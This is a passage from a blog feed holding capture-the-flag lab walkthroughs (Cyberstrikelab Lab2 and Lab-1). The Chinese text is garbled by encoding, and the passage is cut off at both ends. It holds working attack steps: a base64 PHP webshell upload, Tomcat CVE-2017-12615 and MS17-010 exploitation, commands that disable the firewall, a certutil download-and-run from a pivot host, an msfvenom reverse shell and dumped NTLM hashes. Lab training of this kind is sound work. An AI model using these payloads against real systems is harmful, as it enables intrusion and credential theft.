seconds\n```\n\n`Fscan` æ‰«æä¸€ä¸‹\n\n```php\nâœ  fscan ./fscan_1.8.4 -h 192.168.10.1-255\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 192.168.10.10   is alive\n(icmp) Target 192.168.10.20   is alive\n(icmp) Target 192.168.10.233  is alive\n[*] Icmp alive hosts len is: 3\n192.168.10.10:139 open\n192.168.10.20:135 open\n192.168.10.10:3306 open\n192.168.10.10:135 open\n192.168.10.233:22 open\n192.168.10.20:445 open\n192.168.10.20:139 open\n192.168.10.10:445 open\n192.168.10.20:8080 open\n192.168.10.10:7680 open\n192.168.10.233:8080 open\n192.168.10.10:808 open\n192.168.10.20:8009 open\n[*] alive ports len is: 13\nstart vulscan\n[*] NetInfo \n[*]192.168.10.10\n   [->]DESKTOP-JFB57A8\n   [->]192.168.10.10\n[*] WebTitle https://192.168.10.233:8080 code:404 len:19     title:None\n[*] NetBios 192.168.10.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[*] WebTitle http://192.168.10.20:8080 code:200 len:11432  title:Apache Tomcat/8.5.19\n[*] WebTitle http://192.168.10.10:808  code:404 len:1331   title:ç³»ç»Ÿå‘ç”Ÿé”™è¯¯\n[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell \n[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce \n```\n\n`192.168.10.20` æ‰«æå‡ºæ¥ä¸¤ä¸ªæ´\n\n## 192.168.10.20\n\n### cve-2017-12615\n\nè®¿é—® `8080` ç«¯å£\n\n![image.png](/post-images/CyberstrikelabLab2/image7.png)\n\nä¹‹å‰åœ¨ `Fscan` æ‰«æå‡ºæ¥ `cve-2017-12615`\n\n> https://www.cnblogs.com/confidant/p/15440233.html\n> \n\n![image.png](/post-images/CyberstrikelabLab2/image8.png)\n\nè¿ä¸Šå†°è\n\n![image.png](/post-images/CyberstrikelabLab2/image9.png)\n\n### ææƒ\n\næŸ¥çœ‹æƒé™\n\n```php\nC:/Program Files/Apache Software Foundation/Tomcat 8.5/ >whoami /all\n\nç”¨æˆ·ä¿¡æ¯\n----------------\n\nç”¨æˆ·å                       SID     \n============================ ========\nnt authority\\network service S-1-5-20\n\nç»„ä¿¡æ¯\n-----------------\n\nç»„å                                   ç±»å‹   SID          å±æ€§                          \n====================================== ====== ============ ==============================\nMandatory Label\\System Mandatory Level æ ‡ç­¾   S-1-16-16384                               \nEveryone                               å·²çŸ¥ç»„ S-1-1-0      å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„\nBUILTIN\\Users                          åˆ«å   S-1-5-32-545 å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„\nNT AUTHORITY\\SERVICE                   å·²çŸ¥ç»„ S-1-5-6      å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„\nCONSOLE LOGON                          å·²çŸ¥ç»„ S-1-2-1      å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„\nNT AUTHORITY\\Authenticated Users       å·²çŸ¥ç»„ S-1-5-11     å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„\nNT AUTHORITY\\This Organization         å·²çŸ¥ç»„ S-1-5-15     å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„\nLOCAL                                  å·²çŸ¥ç»„ S-1-2-0      å¿…éœ€çš„ç»„, å¯ç”¨äºé»˜è®¤, å¯ç”¨çš„ç»„\n\nç‰¹æƒä¿¡æ¯\n----------------------\n\nç‰¹æƒå                        æè¿°                 çŠ¶æ€  \n============================= ==================== ======\nSeAssignPrimaryTokenPrivilege æ›¿æ¢ä¸€ä¸ªè¿›ç¨‹çº§ä»¤ç‰Œ   å·²ç¦ç”¨\nSeIncreaseQuotaPrivilege      ä¸ºè¿›ç¨‹è°ƒæ•´å†…å­˜é…é¢   å·²ç¦ç”¨\nSeAuditPrivilege              ç”Ÿæˆå®‰å…¨å®¡æ ¸         å·²ç¦ç”¨\nSeChangeNotifyPrivilege       ç»•è¿‡éå†æ£€æŸ¥         å·²å¯ç”¨\nSeImpersonatePrivilege        èº«ä»½éªŒè¯åæ¨¡æ‹Ÿå®¢æˆ·ç«¯ å·²å¯ç”¨\nSeCreateGlobalPrivilege       åˆ›å»ºå…¨å±€å¯¹è±¡         å·²å¯ç”¨\nSeIncreaseWorkingSetPrivilege å¢åŠ è¿›ç¨‹å·¥ä½œé›†       å·²ç¦ç”¨\n```\n\nå¯ä»¥æ‰“ `SweetPotato` ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰“ä¸ä¸Šï¼Œè¿™é‡Œä¸Šçº¿ `MSF` æ¥æ‰“\n\n```php\nmsf6 exploit(multi/handler) > run\n[*] Started reverse TCP handler on 172.16.233.2:4444 \n[*] Sending stage (203846 bytes) to 192.168.10.20\n[*] Meterpreter session 1 opened (172.16.233.2:4444 -> 192.168.10.20:49220) at 2025-08-12 20:22:41 +0800\n\nmeterpreter > getsystem\n...got system via technique 4 (Named Pipe Impersonation (RPCSS variant)).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\n\næˆåŠŸè·å¾— `system` æƒé™\n\nè¯»ç¬¬äºŒä¸ª `flag`\n\n```php\nC:\\>type flag.txt\ngo-flag{2a1AygwfTuccnNJY}\n```\n\n### ä¿¡æ¯æ”¶é›†\n\nè¿˜æœ‰äºŒå±‚å†…ç½‘\n\n![image.png](/post-images/CyberstrikelabLab2/image10.png)\n\nä¸Šçº¿ `Vshell` ï¼Œç›´æ¥å¼¹å³å¯\n\n![image.png](/post-images/CyberstrikelabLab2/image11.png)\n\n`Fscan` æ‰«æå‘ç° `192.168.20.30` å­˜åœ¨æ°¸æ’ä¹‹è“ï¼Œè¦èµ°ä»£ç†æ‰“\n\n![image.png](/post-images/CyberstrikelabLab2/image12.png)\n\nå¯ä»¥ç›´æ¥åœ¨ `Vshell` ä¸Šè¿›è¡Œä»£ç†\n\né€‰æ‹© `192.168.10.20` ç„¶åç‚¹å‡»éš§é“ä»£ç†\n\n![image.png](/post-images/CyberstrikelabLab2/image13.png)\n\n`Kali` è¿æ¥å³å¯\n\n```php\nâœ  Lab2 tail -n 1 /etc/proxychains4.conf\nsocks5  127.0.0.1       2131    admin   admin\nâœ  Lab2 proxychains curl 192.168.20.30:8080\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:8080  ...  OK\ncurl: (52) Empty reply from server\n```\n\n## 192.168.20.30\n\n### æ°¸æ’ä¹‹è“\n\né€šè¿‡ä»£ç†å¯åŠ¨ `MSF`\n\n```php\nâœ  Lab2 proxychains -q msfconsole                                                                                                                                      \nMetasploit tip: The use command supports fuzzy searching to try and \nselect the intended module, e.g. use kerberos/get_ticket or use \nkerberos forge silver ticket\n                                                  \nIIIIII    dTb.dTb        _.---._\n  II     4'  v  'B   .'\"\".'/|\\`.\"\"'.\n  II     6.     .P  :  .' / | \\ `.  :\n  II     'T;. .;P'  '.'  /  |  \\  `.'\n  II      'T; ;P'    `. /   |   \\ .'\nIIIIII     'YvP'       `-.__|__.-'\n\nI love shells --egypt\n\n       =[ metasploit v6.4.69-dev                          ]\n+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]\n+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\nmsf6 > \n```\n\næ‰“ `command` å°±å¥½äº†ï¼Œç›´æ¥è¯» `flag`\n\n```php\nmsf6 > search ms17\nmsf6 > use 19\nmsf6 auxiliary(admin/smb/ms17_010_command) > set command \"type C:\\flag.txt\"\ncommand => type C:\\flag.txt\nmsf6 auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.30\nrhost => 192.168.20.30\n```\n\n![image.png](/post-images/CyberstrikelabLab2/image14.png)",
            "url": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab2",
            "title": "Cyberstrikelab - Lab2",
            "summary": "Lab2 https://www.cyberstrikelab.com/#/scene/detail/21 192.168.10.10 Recon ç«¯å£æ‰«æ 808 æ˜¯ web æœåŠ¡ éª‘å£« CMS è®¿é—® 808 ç«¯å£ åœ¨é¡µå°¾ä¸­èƒ½æ‰¾åˆ° Powered by 74cms v4.2.111 é€šè¿‡æœå¯»ï¼Œå­˜åœ¨...",
            "date_modified": "2025-08-12T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "Cyberstrikelab",
                "Windows",
                "Tomcat",
                "Vshell",
                "å¤šå±‚å†…ç½‘",
                "MS17_010"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab-1",
            "content_html": "\n# Lab-1\n\n> https://www.cyberstrikelab.com/#/scene/detail/20\n> \n\n## Youcms\n\n`youcms`\n\n![image.png](/post-images/CyberstrikelabLab-1/image.png)\n\nç½‘ä¸Šèƒ½æ‰¾åˆ° `youcms` å‰å° `getshell` çš„åˆ©ç”¨\n\n> https://blog.csdn.net/qq_48985780/article/details/121945304\n> \n\n```php\nPOST /index.php/api/Uploadify/preview HTTP/1.1\nHost: 192.168.10.10\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept-Encoding: gzip, deflate\nSec-GPC: 1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\ndata:image/php;base64,PD9waHAgcGhwaW5mbygpOw==\n```\n\nè®¿é—®è¿”å›åŒ…ä¸­çš„ `preview/xxxxxxx.php`\n\n![image.png](/post-images/CyberstrikelabLab-1/image1.png)\n\nå†™å…¥ä¸€å¥è¯æœ¨é©¬\n\n```php\nPOST /index.php/api/Uploadify/preview HTTP/1.1\nHost: 192.168.10.10\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0\nAccept-Encoding: gzip, deflate\nSec-GPC: 1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\ndata:image/php;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsneCddKTs=\n```\n\næµ‹è¯•ï¼Œæ˜¯ `windows`\n\n![image.png](/post-images/CyberstrikelabLab-1/image2.png)\n\n## 192.168.10.10\n\nè¿›è¡Œåå¼¹ `shell`\n\n![image.png](/post-images/CyberstrikelabLab-1/image3.png)\n\n![image.png](/post-images/CyberstrikelabLab-1/image4.png)\n\nå…ˆæŠŠé˜²ç«å¢™å…³äº†ï¼Œç„¶åå¼€å¯è¿œç¨‹æ¡Œé¢\n\n```php\nPS C:\\phpstudy_pro\\WWW\\eyoucms1.0\\preview> netsh advfirewall set allprofiles state off\nOk.\n\nPS C:\\phpstudy_pro\\WWW\\eyoucms1.0\\preview> REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\nThe operation completed successfully.\n```\n\nä¹‹åå†ä¸Šçº¿ `Vshell` ï¼Œä½¿ç”¨ä¸€é”®ä¸Šçº¿å‘½ä»¤å³å¯\n\n![image.png](/post-images/CyberstrikelabLab-1/image5.png)\n\n`C` ç›˜æ ¹ç›®å½•ç¬¬ä¸€ä¸ª flag\n\n```php\nC:\\>type flag.txt\ngo-flag{kn6anDUCzBqtjlX8}\n```\n\nè¿™é‡Œä¸ºäº†æ–¹ä¾¿æ‰€ä»¥ä¸Š `MSF` æŠ“äº†ä¸‹ `HASH`\n\n![image.png](/post-images/CyberstrikelabLab-1/image6.png)\n\nè¿™é‡Œå¯ä»¥ä½¿ç”¨ `evil-winrm` è¿›è¡Œç™»é™†äº†\n\n```php\nmeterpreter > creds_all\n[+] Running as SYSTEM\n[*] Retrieving all credentials\nmsv credentials\n===============\n\nUsername       Domain           NTLM                              SHA1\n--------       ------           ----                              ----\nAdministrator  WIN-KOHRC1DGOL9  a167976f7bd8d93ee232fa7a87a4079e  8b8bca113dee7e588272b1ca6b73b16d017d4434\n\nwdigest credentials\n===================\n\nUsername          Domain           Password\n--------          ------           --------\n(null)            (null)           (null)\nAdministrator     WIN-KOHRC1DGOL9  (null)\nWIN-KOHRC1DGOL9$  WORKGROUP        (null)\n\nkerberos credentials\n====================\n\nUsername          Domain           Password\n--------          ------           --------\n(null)            (null)           (null)\nAdministrator     WIN-KOHRC1DGOL9  (null)\nwin-kohrc1dgol9$  WORKGROUP        (null)\n```\n\n`IP` ä¿¡æ¯\n\n```php\nC:\\>ipconfig\n\nWindows IP é…ç½®\n\nä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘ 3:\n\n   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :\n   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::f934:2031:ffb0:abe5%17\n   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.10.10\n   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0\n   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.10.233\n\nä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘å®ä¾‹ 0:\n\n   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :\n   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::dd76:17c3:eada:75fb%16\n   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.20.10\n   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0\n   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.20.1\n\néš§é“é€‚é…å™¨ isatap.{4DA50EBB-5871-4387-AB71-FF1EF08A5B10}:\n\n   åª’ä½“çŠ¶æ€  . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€\n   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :\n\néš§é“é€‚é…å™¨ isatap.{0A087C82-408A-4C20-8EB3-4E5C11A340D7}:\n\n   åª’ä½“çŠ¶æ€  . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€\n   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :\n```\n\næ‰¾åˆ°å†…ç½‘ç½‘æ®µ `192.168.20.x`\n\nä¸Šä¼  `fscan` æ‰«æ\n\n```php\nPS C:\\> ./fscan -h 192.168.20.1-255\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-08-12 07:42:18] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-08-12 07:42:18] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-08-12 07:42:18] [INFO] ç”ŸæˆIPèŒƒå›´: 192.168.20.1 - 192.168.20.255\n[2025-08-12 07:42:18] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 255\n[2025-08-12 07:42:18] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-08-12 07:42:18] [SUCCESS] ç›®æ ‡ 192.168.20.10   å­˜æ´» (ICMP)\n[2025-08-12 07:42:19] [SUCCESS] ç›®æ ‡ 192.168.20.20   å­˜æ´» (ICMP)\n[2025-08-12 07:42:19] [SUCCESS] ç›®æ ‡ 192.168.20.30   å­˜æ´» (ICMP)\n[2025-08-12 07:42:21] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 3\n[2025-08-12 07:42:21] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:135\n[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:135\n[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:135\n[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:88\n[2025-08-12 07:42:21] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:80\n[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:445\n[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:445\n[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:445\n[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:389\n[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:139\n[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:139\n[2025-08-12 07:42:23] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:139\n[2025-08-12 07:42:26] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:3306\n[2025-08-12 07:42:26] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:3306 => [mysql] äº§å“:MySQL ä¿¡æ¯:unauthorized Banner:[H.j Host 'WIN-KOHRC1DGOL9' is not allowed\nto connect to this MySQL server]\n[2025-08-12 07:42:27] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:88 => \n[2025-08-12 07:42:30] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:80 => [http]\n[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:445 => \n[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:139 =>  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:139 =>  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:445 => \n[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:139 =>  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:445 => \n[2025-08-12 07:42:36] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:389 => \n[2025-08-12 07:43:27] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:135 => \n[2025-08-12 07:43:27] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:135 => \n[2025-08-12 07:43:27] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:135 => \n[2025-08-12 07:43:27] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 13\n[2025-08-12 07:43:27] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-08-12 07:43:27] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-08-12 07:43:27] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 192.168.20.10\nä¸»æœºå: WIN-KOHRC1DGOL9\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 192.168.10.10\n[2025-08-12 07:43:27] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 192.168.20.20\nä¸»æœºå: cyberweb\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 192.168.20.20\n[2025-08-12 07:43:27] [SUCCESS] å‘ç°æ¼æ´ 192.168.20.20 [Windows Server 2012 R2 Standard 9600] MS17-010\n[2025-08-12 07:43:27] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[2025-08-12 07:43:27] [SUCCESS] å‘ç°æ¼æ´ 192.168.20.30 [Windows Server 2008 R2 Standard 7600] MS17-010\n[2025-08-12 07:43:27] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 192.168.20.30\nä¸»æœºå: WIN-7NRTJO59O7N\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 192.168.20.30\n[2025-08-12 07:43:28] [SUCCESS] NetBios 192.168.20.10   WORKGROUP\\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600\n[2025-08-12 07:43:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://192.168.20.10      çŠ¶æ€ç :200 é•¿åº¦:25229  æ ‡é¢˜:æ˜“ä¼˜CMS -  Powered by Eyoucms.com\n[2025-08-12 07:43:40] [SUCCESS] ç›®æ ‡: http://192.168.20.10:80\n  æ¼æ´ç±»å‹: poc-yaml-thinkphp5023-method-rce\n  æ¼æ´åç§°: poc1\n  è¯¦ç»†ä¿¡æ¯:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n```\n\n`192.168.20.20` å’Œ `30` å‘ç°æ°¸æ’ä¹‹è“\n\n## 192.168.20.20 - 1\n\næ‰“æ°¸æ’ä¹‹è“éœ€è¦æ­ä»£ç†\n\nè¿™é‡Œä½¿ç”¨ `stowaway`\n\n```php\n./linux_x64_admin -l 8000 -s 123\n\nStart-Process -FilePath \"C:\\agent.exe\" -ArgumentList \"-c 172.16.233.2:8000 -s 123 --reconnect 8\"\n```\n\n```php\n(admin) >> use 0\n(node 0) >> socks 4444 admin admin\n[*] Trying to listen on 0.0.0.0:4444......\n[*] Waiting for agent's response......\n[*] Socks start successfully!\n```\n\nè®¾ç½®å¥½ä»£ç†åç”¨ `MSF` æ‰“æ°¸æ’ä¹‹è“\n\n```php\nâœ  Lab1 proxychains -q msfconsole\nsearch ms17_010\nuse 19\nset command whoami\nset rhost 192.168.20.20\nrun\n```\n\nä½†æ˜¯è¿™é‡Œåº”è¯¥æ˜¯è¢«ä¿®å¤äº†ï¼Œå…ˆæ”¾ç€\n\n```php\nmsf6 auxiliary(admin/smb/ms17_010_command) > exploit\n\n[*] 192.168.20.20:445     - Target OS: Windows Server 2012 R2 Standard 9600\n[-] 192.168.20.20:445     - Unable to find accessible named pipe!\n[*] 192.168.20.20:445     - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\n## 192.168.20.30\n\nè½¬æ¢ç›®æ ‡ï¼Œæ‰“ `192.168.20.30`\n\n```php\nmsf6 auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.30\nrhost => 192.168.20.30\nmsf6 auxiliary(admin/smb/ms17_010_command) > set command whoami\ncommand => whoami\nmsf6 auxiliary(admin/smb/ms17_010_command) > run\n[*] 192.168.20.30:445     - Target OS: Windows Server 2008 R2 Standard 7600\n[*] 192.168.20.30:445     - Built a write-what-where primitive...\n[+] 192.168.20.30:445     - Overwrite complete... SYSTEM session obtained!\n[+] 192.168.20.30:445     - Service start timed out, OK if running a command or non-service executable...\n[*] 192.168.20.30:445     - Getting the command output...\n[*] 192.168.20.30:445     - Executing cleanup...\n[+] 192.168.20.30:445     - Cleanup was successful\n[+] 192.168.20.30:445     - Command completed successfully!\n[*] 192.168.20.30:445     - Output for \"whoami\":\n\nnt authority\\system\n\n[*] 192.168.20.30:445     - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\næˆåŠŸæ‰§è¡Œï¼Œå‡†å¤‡ä¸Šçº¿ `Vshell` \n\né€šè¿‡ `stowaway` å°†ç›‘å¬ç«¯å£æ˜ å°„åˆ° `192.168.20.10`\n\n```php\n(node 0) >> backward 1234 1234\n[*] Trying to ask node to listen on 0.0.0.0:1234......\n[*] Waiting for agent's response......\n[*] Backward start successfully!\n```\n\né€šè¿‡ `ms17_010` è¿›è¡Œä¸Šçº¿\n\n```php\nset command \"certutil.exe -urlcache -split -f http://192.168.20.10:1234/swt C:\\\\run.bat\"\nrun\nset command \"start C:\\\\run.bat\"\nrun\n```\n\n![image.png](/post-images/CyberstrikelabLab-1/image7.png)\n\n`C` ç›˜æ ¹ç›®å½•èƒ½æ‰¾åˆ°ç¬¬äºŒä¸ª `flag`\n\n```php\ngo-flag{R0M4QwsS6EQp97lw}\n```\n\nå…³é—­é˜²ç«å¢™å’Œå¼€å¯è¿œç¨‹æ¡Œé¢\n\n```php\nC:\\Windows\\system32>netsh advfirewall set allprofiles state off\nç¡®å®šã€‚\n\nC:\\Windows\\system32>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\næ“ä½œæˆåŠŸå®Œæˆã€‚\n```\n\nä¿¡æ¯æ”¶é›†ï¼Œå‘ç°è¯¥æœºå™¨å°±æ˜¯ DC\n\n```php\nC:\\Windows\\system32>net view\næœåŠ¡å™¨åç§°            æ³¨è§£\n\n-------------------------------------------------------------------------------\n\\\\CYBERWEB\n\\\\WIN-7NRTJO59O7N\nå‘½ä»¤æˆåŠŸå®Œæˆã€‚\n\nPS C:\\> net view /domain\nDomain\n\n-------------------------------------------------------------------------------\nCYBERSTRIKELAB\nå‘½ä»¤æˆåŠŸå®Œæˆã€‚\n\nC:\\Windows\\system32>net view /domain\nDomain\n\n-------------------------------------------------------------------------------\nCYBERSTRIKELAB\nå‘½ä»¤æˆåŠŸå®Œæˆã€‚\n\nC:\\Windows\\system32>net group \"domain controllers\"\nç»„å     Domain Controllers\næ³¨é‡Š     åŸŸä¸­æ‰€æœ‰åŸŸæ§åˆ¶å™¨\n\næˆå‘˜\n\n-------------------------------------------------------------------------------\nWIN-7NRTJO59O7N$\n```\n\nä¸Šçº¿ `MSF` ï¼Œå’Œä¸Šé¢ä¸Šçº¿ `Vshell`çš„æ“ä½œç±»ä¼¼\n\n```php\n(node 0) >> backward 9009 9009\n[*] Trying to ask node to listen on 0.0.0.0:9009......\n[*] Waiting for agent's response......\n[*] Backward start successfully!\n```\n\n```php\nmsf6 exploit(multi/handler) > set lport 9009\nlport => 9009\nmsf6 exploit(multi/handler) > options\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)\n   LPORT     9009             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(multi/handler) > run\n[*] Started reverse TCP handler on 0.0.0.0:9009 \n```\n\n```php\nâœ  Lab1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.10 LPORT=9009 -f exe -o shell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: shell.exe\n```\n\nå°† `shell.exe` ä¸Šä¼ åˆ° `192.168.20.30` ï¼Œç„¶åè¿è¡Œ\n\n![image.png](/post-images/CyberstrikelabLab-1/image8.png)\n\næŠ“å– `hash`\n\n```php\nmeterpreter > 